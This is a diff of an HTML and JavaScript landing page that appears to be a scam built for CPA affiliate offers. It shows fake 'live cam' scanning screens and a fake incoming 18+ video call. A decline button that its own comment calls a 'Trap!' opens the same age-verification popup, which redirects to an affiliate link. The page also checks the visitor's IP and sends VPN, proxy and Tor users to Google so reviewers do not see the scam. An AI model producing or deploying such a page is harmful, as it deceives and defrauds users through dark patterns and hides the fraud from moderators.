@@ -4,100 +4,133 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
+    <!-- No Referrer Data for CPA Network Safety -->
     <meta name="referrer" content="no-referrer">
 
-    <title>Incoming Video Call...</title>
+    <title>Private Live Cam...</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body, html { height: 100%; width: 100%; background: #000; overflow: hidden; color: #fff; }
 
         /* =========================================
-           1. TERMINAL SECURITY SCANNER (ANTI-VPN)
+           1. QUAD-CAM SECURITY SCANNER (4 Corners)
            ========================================= */
-        #security-terminal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; 
-            padding: 20px; z-index: 9999; display: flex; flex-direction: column; justify-content: center;
+        #quad-scanner {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999;
+            display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 2px; background: #222;
         }
-        .term-text { color: #00ff00; font-family: 'Courier New', Courier, monospace; font-size: 14px; margin-bottom: 8px; }
-        .term-red { color: #ff3333; font-weight: bold; font-size: 18px; margin-top: 15px; display: none; text-align: center; }
-        .blink { animation: blinker 1s linear infinite; }
+        .cam-feed {
+            background: #050505; position: relative; overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
+        }
+        /* Fake Static/Noise Effect */
+        .cam-feed::before {
+            content: ""; position: absolute; top: -50%; left: -50%; right: -50%; bottom: -50%;
+            background: repeating-linear-gradient(0deg, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 2px);
+            animation: staticNoise 0.2s infinite; opacity: 0.5; pointer-events: none;
+        }
+        @keyframes staticNoise { 0% { transform: translateY(0); } 100% { transform: translateY(10px); } }
+        
+        .cam-label { position: absolute; top: 10px; left: 10px; color: #00ff00; font-family: monospace; font-size: 10px; background: rgba(0,0,0,0.6); padding: 2px 5px; }
+        .cam-rec { position: absolute; top: 10px; right: 10px; color: red; font-family: monospace; font-size: 10px; animation: blinker 1s infinite; }
+        
+        /* Central Overlay Text */
+        .scan-overlay {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.85); border: 1px solid #00ff00; padding: 15px 25px;
+            border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(0,255,0,0.2); width: 85%; max-width: 300px;
+        }
+        .scan-text { color: #00ff00; font-family: 'Courier New', monospace; font-size: 14px; font-weight: bold; margin-bottom: 5px; }
+        .scan-sub { color: #aaa; font-family: 'Courier New', monospace; font-size: 11px; }
+        .alert-red { color: #ff3333; border-color: #ff3333; box-shadow: 0 0 20px rgba(255,51,51,0.4); display: none; }
+
         @keyframes blinker { 50% { opacity: 0; } }
 
         /* =========================================
-           2. INCOMING VIDEO CALL UI (CLEAN TRAFFIC)
+           2. INCOMING VIDEO CALL UI (No Names)
            ========================================= */
         #main-content { display: none; height: 100%; width: 100%; position: relative; }
         
         .bg-video {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=1000&auto=format&fit=crop') center top/cover;
-            filter: blur(15px) brightness(0.4); z-index: 1; transform: scale(1.1);
+            background: url('https://images.unsplash.com/photo-1616788225565-d06992ee6491?q=80&w=1000&auto=format&fit=crop') center center/cover;
+            filter: blur(18px) brightness(0.3); z-index: 1; transform: scale(1.1);
         }
 
         .call-interface {
             position: relative; z-index: 2; height: 100%; display: flex; flex-direction: column;
-            justify-content: space-between; align-items: center; padding: 50px 20px;
+            justify-content: space-between; align-items: center; padding: 60px 20px 40px;
         }
 
-        .caller-info { text-align: center; margin-top: 20px; }
-        .caller-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #00ff66; margin-bottom: 15px; box-shadow: 0 0 20px rgba(0, 255, 102, 0.4); }
-        .caller-name { font-size: 28px; font-weight: 600; letter-spacing: 1px; }
-        .call-status { font-size: 16px; color: #00ff66; margin-top: 8px; animation: blinker 1.5s infinite; }
+        .caller-info { text-align: center; }
+        .caller-icon { font-size: 60px; margin-bottom: 15px; animation: float 3s ease-in-out infinite; }
+        .caller-name { font-size: 26px; font-weight: 300; letter-spacing: 1.5px; color: #fff; margin-bottom: 8px; }
+        .call-status { font-size: 14px; color: #00ff66; font-family: monospace; background: rgba(0,255,102,0.1); padding: 4px 10px; border-radius: 20px; animation: blinker 1.5s infinite; display: inline-block; }
 
-        .action-buttons { display: flex; gap: 30px; margin-bottom: 30px; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+        .action-buttons { display: flex; gap: 40px; margin-bottom: 20px; }
         
-        .btn { width: 70px; height: 70px; border-radius: 50%; border: none; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; }
+        .btn { width: 75px; height: 75px; border-radius: 50%; border: none; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; }
         .btn:active { transform: scale(0.9); }
-        
-        .btn-decline { background: #ff3b30; box-shadow: 0 0 20px rgba(255, 59, 48, 0.4); }
-        .btn-accept { background: #34c759; box-shadow: 0 0 20px rgba(52, 199, 89, 0.6); animation: pulse-green 2s infinite; }
-        
+        .btn-decline { background: rgba(255, 59, 48, 0.9); backdrop-filter: blur(5px); }
+        .btn-accept { background: #34c759; box-shadow: 0 0 25px rgba(52, 199, 89, 0.6); animation: pulse-green 1.5s infinite; }
         .btn svg { width: 35px; height: 35px; fill: #fff; }
 
         @keyframes pulse-green {
             0% { box-shadow: 0 0 0 0 rgba(52, 199, 89, 0.7); }
-            70% { box-shadow: 0 0 0 20px rgba(52, 199, 89, 0); }
+            70% { box-shadow: 0 0 0 25px rgba(52, 199, 89, 0); }
             100% { box-shadow: 0 0 0 0 rgba(52, 199, 89, 0); }
         }
 
         /* Verification Popup */
         .popup {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.8);
-            background: rgba(20, 20, 25, 0.95); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1);
-            width: 90%; max-width: 350px; border-radius: 24px; padding: 30px 20px; text-align: center;
-            z-index: 10; opacity: 0; visibility: hidden; transition: all 0.3s ease; box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+            background: rgba(15, 15, 18, 0.95); backdrop-filter: blur(15px); border: 1px solid rgba(255, 42, 133, 0.3);
+            width: 90%; max-width: 360px; border-radius: 20px; padding: 35px 25px; text-align: center;
+            z-index: 10; opacity: 0; visibility: hidden; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.9);
         }
         .popup.active { opacity: 1; visibility: visible; transform: translate(-50%, -50%) scale(1); }
-        .popup h3 { font-size: 22px; margin-bottom: 10px; color: #fff; }
-        .popup p { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
+        .popup-icon { font-size: 45px; margin-bottom: 10px; }
+        .popup h3 { font-size: 20px; margin-bottom: 12px; color: #fff; font-weight: 600; }
+        .popup p { font-size: 13px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
         
         .verify-btn {
-            background: linear-gradient(135deg, #34c759, #00ff66); color: #000; border: none;
-            width: 100%; padding: 15px; border-radius: 12px; font-size: 16px; font-weight: bold;
-            cursor: pointer; text-transform: uppercase;
+            background: linear-gradient(135deg, #ff2a85, #ff7b00); color: #fff; border: none;
+            width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: bold;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 10px 20px rgba(255, 42, 133, 0.3);
         }
     </style>
 </head>
 <body>
 
-    <div id="security-terminal">
-        <div id="log-container">
-            <div class="term-text">> INITIATING NETWORK SCAN...</div>
+    <!-- 1. QUAD-CAM SCANNER (Anti-VPN & Connection Screen) -->
+    <div id="quad-scanner">
+        <div class="cam-feed"><span class="cam-label">CAM 01: OFFLINE</span></div>
+        <div class="cam-feed"><span class="cam-label">CAM 02: SEARCHING</span></div>
+        <div class="cam-feed"><span class="cam-label">CAM 03: OFFLINE</span></div>
+        <div class="cam-feed"><span class="cam-label">CAM 04: CONNECTING</span><span class="cam-rec">REC</span></div>
+        
+        <div class="scan-overlay" id="scan-box">
+            <div class="scan-text" id="scan-title">SEARCHING LIVE CAMS...</div>
+            <div class="scan-sub" id="scan-desc">Bypassing local network security</div>
         </div>
-        <div id="vpn-alert" class="term-red blink">⚠️ ACCESS DENIED: VPN/PROXY DETECTED ⚠️<br><span style="font-size:12px; color:#aaa; font-weight:normal; display:block; margin-top:10px;">Redirecting to safe zone...</span></div>
     </div>
 
+    <!-- 2. MAIN LANDING PAGE (Anonymous Call UI) -->
     <div id="main-content">
         <div class="bg-video"></div>
         
         <div class="call-interface">
             <div class="caller-info">
-                <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=200&auto=format&fit=crop" class="caller-img" alt="Caller">
-                <div class="caller-name">Jessica is calling...</div>
-                <div class="call-status">Live Video Requested</div>
+                <div class="caller-icon">👤</div>
+                <div class="caller-name">Private Connection</div>
+                <div class="call-status">● LIVE CAM REQUESTED</div>
             </div>
 
             <div class="action-buttons">
+                <!-- Decline Button triggers the same popup (Trap!) -->
                 <button class="btn btn-decline" onclick="showPopup()">
                     <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
                 </button>
@@ -107,84 +140,91 @@
             </div>
         </div>
 
+        <!-- Pop-up for Redirect -->
         <div class="popup" id="verify-popup">
-            <h3>Connection Unstable</h3>
-            <p>To accept this private 18+ video call, please verify your age quickly. The call will connect automatically after verification.</p>
-            <button class="verify-btn" onclick="goToOffer()">VERIFY TO CONNECT</button>
+            <div class="popup-icon">🔞</div>
+            <h3>Stream Locked</h3>
+            <p>This is an uncensored private broadcast. You must quickly verify your age to unblur the video and start the session.</p>
+            <button class="verify-btn" onclick="goToOffer()">VERIFY TO WATCH</button>
+            <div style="font-size: 11px; color: #666; margin-top: 15px; font-family: monospace;">Secured via P2P Encryption</div>
         </div>
     </div>
 
     <script>
-        // 👇 আপনার সিপিএ লিংক এখানে বসান 
+        // 👇 আপনার সিপিএ লিংক এখানে বসান
         const CPA_LINK = "https://shroo.link/esAkE"; 
 
         // ===============================================
-        // ADVANCED SECURITY SCANNER LOGIC
+        // MASTERMIND 4-CAM SCANNER LOGIC
         // ===============================================
         async function runDeepScan() {
-            const logs = [
-                "> CHECKING BROWSER INTEGRITY...",
-                "> ANALYZING IP REPUTATION...",
-                "> DETECTING PROXY/VPN TUNNELS..."
-            ];
-            
-            let logContainer = document.getElementById('log-container');
-            let terminal = document.getElementById('security-terminal');
+            let scanBox = document.getElementById('scan-box');
+            let title = document.getElementById('scan-title');
+            let desc = document.getElementById('scan-desc');
+            let quadScanner = document.getElementById('quad-scanner');
             let mainContent = document.getElementById('main-content');
-            let vpnAlert = document.getElementById('vpn-alert');
 
-            // 1. Simulate Terminal Typing
-            for(let i=0; i<logs.length; i++) {
-                await new Promise(r => setTimeout(r, 600));
-                logContainer.innerHTML += `<div class="term-text">${logs[i]}</div>`;
-            }
+            // Animation sequence
+            setTimeout(() => { desc.innerText = "Checking IP Reputation..."; }, 800);
+            setTimeout(() => { desc.innerText = "Detecting proxy/VPN tunnels..."; }, 1600);
 
-            // 2. Real-time IP Check
             try {
                 let res = await fetch('https://ipwho.is/');
                 let data = await res.json();
                 
+                // If VPN/Proxy/Bot is detected
                 if (data.success && data.security && (data.security.vpn || data.security.proxy || data.security.tor || data.security.hosting)) {
-                    await new Promise(r => setTimeout(r, 500));
-                    logContainer.style.display = 'none';
-                    vpnAlert.style.display = 'block'; 
+                    await new Promise(r => setTimeout(r, 600));
+                    scanBox.classList.add('alert-red');
+                    title.innerText = "ACCESS DENIED";
+                    title.style.color = "#ff3333";
+                    desc.innerText = "VPN/Proxy Detected. Connection Terminated.";
+                    desc.style.color = "#ff3333";
                     
-                    // Redirect fake traffic to Google
-                    setTimeout(() => { window.location.replace("https://www.google.com"); }, 2500);
+                    // Kicks fake traffic out to Google
+                    setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
                     return; 
                 }
-            } catch(e) {
-                // Ignore API adblock errors and let traffic through
-            }
+            } catch(e) {}
 
-            // 3. Clean Traffic - Launch Landing Page
-            await new Promise(r => setTimeout(r, 800));
-            logContainer.innerHTML += `<div class="term-text" style="color:#fff">> CONNECTION SECURE. OPENING MODULE...</div>`;
-            
+            // If Traffic is Clean -> Match Found
+            setTimeout(() => { 
+                title.innerText = "LOCAL MATCH FOUND!";
+                desc.innerText = "Establishing direct P2P connection...";
+                title.style.color = "#fff";
+                scanBox.style.background = "#34c759";
+                scanBox.style.borderColor = "#34c759";
+                scanBox.style.boxShadow = "0 0 30px rgba(52, 199, 89, 0.5)";
+            }, 2500);
+
+            // Transition to Main Call UI
             setTimeout(() => {
-                terminal.style.display = 'none';
+                quadScanner.style.display = 'none';
                 mainContent.style.display = 'block';
-                document.querySelector('.caller-img').style.animation = "pulse-green 2s infinite";
-            }, 600);
+            }, 3500);
         }
 
-        // Start scan on load
         window.onload = runDeepScan;
 
         // ===============================================
-        // UI INTERACTIONS
+        // UI INTERACTIONS & TRAPS
         // ===============================================
         function showPopup() {
+            // Makes the background even darker and more blurred
+            document.querySelector('.bg-video').style.filter = "blur(30px) brightness(0.15)";
+            document.querySelector('.call-interface').style.display = "none";
             document.getElementById('verify-popup').classList.add('active');
-            document.querySelector('.bg-video').style.filter = "blur(25px) brightness(0.2)";
         }
 
         function goToOffer() {
             let btn = document.querySelector('.verify-btn');
-            btn.innerHTML = "CONNECTING... ⏳";
+            btn.innerHTML = "DECRYPTING STREAM... ⏳";
+            btn.style.background = "#333";
+            btn.style.boxShadow = "none";
+            
             setTimeout(() => {
                 window.location.replace(CPA_LINK);
-            }, 800);
+            }, 1000);
         }
     </script>
 </body>
